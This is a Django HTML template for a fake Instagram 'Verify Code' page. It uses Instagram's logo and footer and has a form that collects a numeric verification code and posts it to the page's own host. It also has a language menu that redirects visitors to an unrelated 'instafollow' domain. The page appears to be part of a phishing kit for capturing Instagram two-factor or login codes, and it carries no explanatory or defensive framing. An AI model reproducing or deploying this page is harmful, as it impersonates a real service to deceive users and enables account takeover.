{% load static %}
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Verify Code</title>
    <link rel="stylesheet" href="{% static "scss/stylecss.css" %}">
</head>
<body>
<span id="root">
    <section class="section-all">

      <!-- 1-Role Main -->
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo"
                       src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                       alt="Instagram">
                </div><!-- Header end -->
                <div class="form-wrap">
                  <form class="form" method="post">
                    {% csrf_token %}
                    <div class="input-box">
                      <input type="number" id="name" aria-describedby="" placeholder="Inter Code"
                             aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="code"
                             value="" required>
                    </div>
                    <span class="button-box">
                      <button class="btn" type="submit" name="submit">Verify</button>
                    </span>
                  </form>
                </div> <!-- Form-wrap end -->
              </div>

              <div class="app">
                <p>Get the app.</p>
                <div class="app-img">
                  <a href="#">
                    <img src="#">
                  </a>
                  <a href="#">
                    <img src="#">
                  </a>
                </div>  <!-- App-img end-->
              </div> <!-- App end -->
            </div> <!-- Content end -->
          </article>
        </div> <!-- Wrapper end -->
      </main>

        <!-- 2-Role Footer -->
      <footer class="footer" role="contentinfo">
        <div class="footer-container">

          <nav class="footer-nav" role="navigation">
            <ul>
              <li><a href="">About Us</a></li>
              <li><a href="">Support</a></li>
              <li><a href="">Blog</a></li>
              <li><a href="">Press</a></li>
              <li><a href="">Api</a></li>
              <li><a href="">Jobs</a></li>
              <li><a href="">Privacy</a></li>
              <li><a href="">Terms</a></li>
              <li><a href="">Directory</a></li>
              <li>
                <span class="language">Language
                  <select name="language" class="select" onchange="la(this.value)">
                    <option value="#">English</option>
                    <option value="http://ru-instafollow.bitballoon.com">Russian</option>
                  </select>
                </span>
              </li>
            </ul>
          </nav>

          <span class="footer-logo">&copy; 2018 Instagram</span>
        </div> <!-- Footer container end -->
      </footer>

    </section>
  </span> <!-- Root -->

<!-- Select Link -->
<script type="text/javascript">
    function la(src) {
        window.location = src;
    }
</script>
</body>
</html>
